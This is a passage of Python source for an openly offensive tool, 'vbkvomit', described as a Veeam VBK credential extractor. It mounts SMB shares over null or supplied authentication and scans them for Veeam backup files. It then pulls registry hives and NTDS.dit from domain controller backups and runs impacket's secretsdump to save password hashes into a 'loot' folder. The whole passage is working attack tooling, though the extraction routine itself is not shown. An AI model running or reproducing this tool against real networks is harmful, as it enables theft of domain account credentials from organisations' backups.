        c = input("[?] Select shares (1,2,... or 'a'): ").strip().lower()
        if c in ("a", "all"): return [s[0] for s in shares]
        try:
            sel = [shares[int(x)-1][0] for x in c.split(",")
                   if 1 <= int(x) <= len(shares)]
            if sel: return sel
        except: pass
        print("[!] Invalid")

def create_cifs_creds(domain, user, password):
    fd, path = tempfile.mkstemp(prefix="vbkvomit_", suffix=".creds")
    os.close(fd)
    with open(path, "w") as f:
        if domain:   f.write(f"domain={domain}\n")
        if user:     f.write(f"username={user}\n")
        if password: f.write(f"password={password}\n")
    os.chmod(path, 0o600)
    return path

def mount_cifs(host, share, creds_file):
    pre = _sudo()
    mnt = Path("/mnt") / share
    subprocess.run([*pre, "mkdir", "-p", str(mnt)], capture_output=True)
    if is_mounted(str(mnt)):
        c = input(f"[?] {mnt} mounted. [r]euse/[u]nmount/[s]kip? ").lower()
        if c == "r": return str(mnt)
        elif c == "u": force_umount(str(mnt))
        else: return None
    sz = Path(creds_file).stat().st_size if creds_file and Path(creds_file).exists() else 0
    # uid/gid so the mounted files are owned by the invoking user (mount runs
    # as root via sudo, but the tool itself stays unprivileged).
    fast = (f"vers=3.1.1,rsize=4194304,wsize=4194304,cache=loose,iocharset=utf8,"
            f"ro,uid={os.getuid()},gid={os.getgid()}")
    opts = (f"credentials={creds_file},{fast}" if sz else f"guest,{fast}")
    r = subprocess.run([*pre, "mount", "-t", "cifs", f"//{host}/{share}", str(mnt),
                        "-o", opts], capture_output=True)
    if r.returncode == 0:
        print(f"[+] Mounted {share} at {mnt} (read-only)")
        return str(mnt)
    print(f"[!] Mount failed: {r.stderr.decode(errors='replace').strip()}")
    return None


# ═══ VBK file scanning ════════════════════════════════════════════════════════

def scan_dir(directory):
    found, stack = [], [str(directory)]
    while stack:
        cur = stack.pop()
        try:
            with os.scandir(cur) as it:
                for e in it:
                    try:
                        if e.is_dir(follow_symlinks=False): stack.append(e.path)
                        elif e.is_file(follow_symlinks=False) and e.name.lower().endswith(_VBK_EXT):
                            found.append(e.path)
                            tprint(f"    [+] {e.name} ({size_str(e.path)})")
                    except: pass
        except: pass
    return found

def find_vbk_files(paths, workers=10):
    print("[*] Scanning for VBK files...")
    early, tasks = [], []
    for path in paths:
        p = Path(path)
        if not p.exists(): print(f"[!] Not found: {path}"); continue
        try:
            with os.scandir(p) as it:
                for e in it:
                    if e.is_dir(follow_symlinks=False): tasks.append(Path(e.path))
                    elif e.is_file(follow_symlinks=False) and e.name.lower().endswith(_VBK_EXT):
                        early.append(e.path)
                        print(f"    [+] {e.name} ({size_str(e.path)})")
        except: pass
    result = list(early)
    if tasks:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            for fut in as_completed({ex.submit(scan_dir, d): d for d in tasks}):
                try: result.extend(fut.result())
                except: pass
    print(f"[*] Found {len(result)} VBK file(s)")
    return result

def select_vbk(files):
    if not files: return []
    print("\n[*] VBK files:")
    for i, f in enumerate(files, 1):
        print(f"  [{i}] {Path(f).name} ({size_str(f)})")
    print("  [a] All  [n] None")
    while True:
        c = input("[?] Select (1,2,... or 'a'/'n'): ").lower()
        if c in ("n", "none"): return []
        if c in ("a", "all"): return files
        try:
            sel = [files[int(x)-1] for x in c.split(",") if 1 <= int(x) <= len(files)]
            if sel: return sel
        except: pass
        print("[!] Invalid")


# ═══ Setup helpers ═══════════════════════════════════════════════════════════

def ensure_mount_privs():
    """SMB mode mounts the share with mount.cifs (root-only), but the tool
    itself runs unprivileged and only shells `mount`/`umount` through sudo.
    Confirm that will work; if sudo needs a password, note it up front."""
    if os.geteuid() == 0:
        return
    if shutil.which("sudo") is None:
        die("Need root to mount the share and 'sudo' isn't available. "
            "Re-run as root, or use --local-path on an already-mounted share.")
    if subprocess.run(["sudo", "-n", "true"], capture_output=True).returncode != 0:
        print("[*] Mounting the share needs sudo — you may be prompted for "
              "your password.")

def _secretsdump_imports_ok(cmd):
    """True if `cmd -h` runs without dying on an import error.  Catches the
    common apt-vs-pip impacket split where the wrapper script imports a
    shadowing user-local impacket that lacks newer symbols (KeyListSecrets)."""
    try:
        r = subprocess.run([*cmd, "-h"], capture_output=True, text=True, timeout=30)
    except Exception:
        return False
    blob = r.stdout + r.stderr
    if any(x in blob for x in ("ImportError", "ModuleNotFoundError", "Traceback")):
        return False
    return r.returncode == 0


def find_secretsdump():
    """Return an argv prefix (list) for a *working* secretsdump, or None.

    We build candidate commands from PATH plus the invoking user's
    ~/.local/bin (important under sudo, where PATH is reset and the pip
    --user install disappears), then pick the first candidate that actually
    imports cleanly — a mismatched impacket crashes at startup otherwise."""
    candidates = []
    bin_paths = []
    su = os.environ.get("SUDO_USER")
    if su:
        bin_paths += [Path(f"/home/{su}/.local/bin/secretsdump.py"),
                      Path(f"/home/{su}/.local/bin/impacket-secretsdump")]
    bin_paths.append(Path(os.path.expanduser("~")) / ".local/bin/secretsdump.py")
    for p in bin_paths:
        if p.exists():
            candidates.append([sys.executable, str(p)])
    for n in ("secretsdump.py", "impacket-secretsdump"):
        p = shutil.which(n)
        if p:
            candidates.append([p])
    seen, uniq = set(), []
    for c in candidates:
        k = tuple(c)
        if k not in seen:
            seen.add(k); uniq.append(c)
    for c in uniq:
        if _secretsdump_imports_ok(c):
            return c
    return uniq[0] if uniq else None

def check_deps():
    if shutil.which("mount.cifs") is None:
        die("mount.cifs missing — apt install cifs-utils")
    try: import impacket  # noqa
    except ImportError:
        die("impacket missing — pip install impacket")


# ═══ Mode runners ════════════════════════════════════════════════════════════

def run_smb(args, sd_path, out_dir):
    host = args.target
    user = args.username or ""; pw = args.password or ""; dom = args.domain or ""
    if user and not pw: pw = getpass.getpass("[?] Password: ")
    auth = f"{dom}\\{user}" if dom else (user or "null auth")
    print(f"[*] Connecting to {host} as {auth}...")
    shares = list_smb_shares(host, user, pw, dom)
    if not shares: die("No accessible shares")
    selected = select_shares(shares)
    creds = create_cifs_creds(dom, user, pw)
    mounted = []
    try:
        for sh in selected:
            m = mount_cifs(host, sh, creds)
            if m: mounted.append(m)
        if not mounted: die("No shares mounted")
        scan_paths = mounted
        if args.path:
            parts = args.path.replace("\\", "/").split("/", 1)
            if len(parts) > 1:
                scan_paths = [str(Path(mounted[0]) / parts[1])]
        vbks = find_vbk_files(scan_paths, workers=args.workers)
        if not vbks: print("[!] No VBK files found"); return
        for vbk in select_vbk(vbks):
            process_vbk(vbk, sd_path, out_dir, want_ntds=args.ntds,
                        fast=(args.mode == "fast"), full_extract=(args.mode == "full-extract"),
                        extract_dir=args.extract_dir)
        print("\n[+] Done")
    finally:
        for m in mounted:
            if is_mounted(m): force_umount(m)
        try: os.remove(creds)
        except: pass

def run_local(args, sd_path, out_dir):
    valid = []
    for p in args.local_path:
        pp = Path(p).resolve()
        if pp.is_file() and pp.name.lower().endswith(_VBK_EXT):
            valid.append([str(pp)])
        elif pp.is_dir():
            valid.append(str(pp))
    if not valid: die("No valid local paths or VBK files")
    direct_files = [v[0] for v in valid if isinstance(v, list)]
    dirs = [v for v in valid if isinstance(v, str)]
    vbks = list(direct_files)
    if dirs:
        vbks.extend(find_vbk_files(dirs, workers=args.workers))
    if not vbks: print("[!] No VBK files found"); return
    if len(vbks) == 1:
        process_vbk(vbks[0], sd_path, out_dir, want_ntds=args.ntds,
                    fast=(args.mode == "fast"), full_extract=(args.mode == "full-extract"),
                    extract_dir=args.extract_dir)
    else:
        for vbk in select_vbk(vbks):
            process_vbk(vbk, sd_path, out_dir, want_ntds=args.ntds,
                        fast=(args.mode == "fast"), full_extract=(args.mode == "full-extract"),
                        extract_dir=args.extract_dir)
    print("\n[+] Done")


def main():
    print(BANNER)

    p = argparse.ArgumentParser(
        description="vbkvomit — Veeam VBK credential extractor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  SMB null auth:     %(prog)s -t 192.168.15.151
  SMB authenticated: %(prog)s -t 10.10.10.5 -u admin -p s3cr3t -d corp
  SMB specific path: %(prog)s -t 192.168.15.151 --path "lab/VeeamBackups"
  Local directory:   %(prog)s --local-path /mnt/backups
  Single VBK file:   %(prog)s --local-path /tmp/dc_backup.vbk
  MFT scan mode:     %(prog)s --local-path /tmp/dc_backup.vbk -m mft
  Full VHD dump:     %(prog)s --local-path /tmp/dc_backup.vbk -m full-extract --extract-dir /mnt/lab/VeeamBackups
        """,
    )
    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("-t", "--target", metavar="HOST",
                      help="SMB host to enumerate VBK files from")
    mode.add_argument("--local-path", nargs="+", metavar="PATH",
                      help="Local directory or VBK file path(s)")
    p.add_argument("-u", "--username", default="")
    p.add_argument("-p", "--password", default="")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--path", default="",
                   help="Path within the SMB share (e.g. lab/VeeamBackups)")
    p.add_argument("--out-dir", default=str(BASE_DIR / "vbkvomit_loot"),
                   help="Where to save extracted hives + secretsdump output "
                        "(default: vbkvomit_loot/ next to the tool)")
    p.add_argument("--extract-dir", default=None, metavar="DIR",
                   help="Output directory for raw disk images when using -m full-extract. "
                        "Defaults to --out-dir if not set.")
    p.add_argument("--workers", type=int, default=10,
                   help="Threads for parallel VBK scanning")
    p.add_argument("--no-ntds", dest="ntds", action="store_false",
                   help="Skip NTDS.dit. By default, if a backup contains "
                        "ntds.dit (DC backups) it is extracted and dumped "
                        "automatically — runs are located by ESE-checksum "
                        "content matching, so the DB dumps cleanly.")
    p.add_argument("-m", "--mode",
                   choices=["fast", "mft", "full-extract"], default="fast",
                   help="Extraction mode (default: fast). "
                        "fast: dissect-based direct extraction, ~5-15x faster than mft scan — needs 'pip install dissect'. "
                        "mft: walk the NTFS MFT in raw VBK blocks, no dissect required. "
                        "full-extract: dump disk(s) from the VBK as Fixed VHD files via dissect "
                        "(same format as Veeam extract.exe). Mount on Linux with qemu-nbd, "
                        "or attach directly in Windows Disk Management.")
    args = p.parse_args()

    if args.target is not None:
        ensure_mount_privs()
    check_deps()
    sd = find_secretsdump()
    if not sd:
        print("[!] secretsdump.py not found — will extract hives but skip hash dump")
    else:
        print(f"[*] secretsdump: {' '.join(sd)}")
    out_dir = Path(args.out_dir).resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    print(f"[*] Loot dir: {out_dir}")

    if args.local_path is not None:
        run_local(args, sd, out_dir)
    else:
        run_smb(args, sd, out_dir)


if __name__ == "__main__":
    main()
